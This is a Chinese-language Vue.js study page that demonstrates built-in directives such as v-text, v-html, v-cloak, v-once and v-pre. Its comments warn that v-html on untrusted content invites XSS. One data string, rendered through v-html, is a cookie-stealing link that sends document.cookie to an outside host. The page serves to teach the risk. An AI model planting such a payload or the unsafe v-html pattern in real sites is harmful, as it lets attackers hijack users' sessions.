<!DOCTYPE html>
<html>
  <head>
    <meta charset='UTF-8'/>
    <title>内置指令</title>
    <script src='./vue.js' type='text/javascript'>
    </script>
    <style>
        [v-cloak]{
            display: none;
        }
    </style>
  </head>
  <body>
      <!-- 用过的指令
        v-bind:单向绑定解析表达式，简写为 <h1 :='xxxx'></h1>
        v-model:双向数据绑定，v-model='',多用于文本输入框
        v-for:遍历数组，对象，字符串 li中有用过
        v-if ：条件渲染，动态控制节点是否存在
        v-else:条件渲染，动态控制节点是否存在
        v-show:条件渲染，动态控制节点是否展示
    v-text:向所在节点渲染文本内容
    与插值语法{{xxx}}的区别：v-text会替换掉节点内容，{{xxx}}则不会

    v-html：可以解析字符中的模板语法
    在网站上动态渲染任意HTML是非常危险的，容易导致xss攻击
    一定要在可信的内容上使用v-html,永远不在用户提交的内容上使用v-html

    v-cloak:用在服务器返回js文件特别慢的情况，如果使用插值语法页面会显示{{xxx}} 影响观感，使用v-cloak.配合css设置下style，对该所有含有v-cloak的标签设置display为none，即可在js文件返回之前控制标签不显示内容。待js文件返回后重新加载内容时，v-cloak标签会被删掉，就又能显示了

    v-once:所在节点经过第一次渲染后，变为静态内容不再随着值变化改变,数据改变不会引起结构更新

    v-pre:跳过所在节点的编译过程
    可利用它跳过：没有使用指令语法，没有使用插值语法的节点，可加快编译过程
    -->
    <div id="root">
        <!-- v-text -->
        <h1>{{name}}</h1>
        <h1 v-text="name"></h1>

        <h1 v-html="str"></h1>
        <h1 v-html="str2"></h1>

        <h1 v-cloak>22222</h1>

        <h3 v-once>初始化的n值是{{n}}</h3>
        <h3>当前n值是{{n}}</h3>
        <button @click="n++">点我n+1</button>
    </div>
    -----------------

    <div id="root1">
        <h3 v-pre>kdallalal</h3>
        <h3 v-pre>当前n值是{{n}}</h3>
        <button v-pre @click="n++">点我n+1</button>
    </div>
    <script>
        new Vue({
               el:'#root',
               data() {
                 return {
                    name:'呵呵',
                    str:'<h1>哈哈</h1>',
                    str2:'<a href=javascript:location.href="http://baidu.com?"+document.cookie>冒充用户盗取cookie登录</a>',
                    str3:'1211',
                    n:1
                 }
               },
               methods: {
        
               },
           })

           new Vue({
                  el:'#root1',
                  data() {
                    return {
                        n:1
                    }
                  },
                  methods: {
           
                  },
              })
    </script>
  </body>
</html>
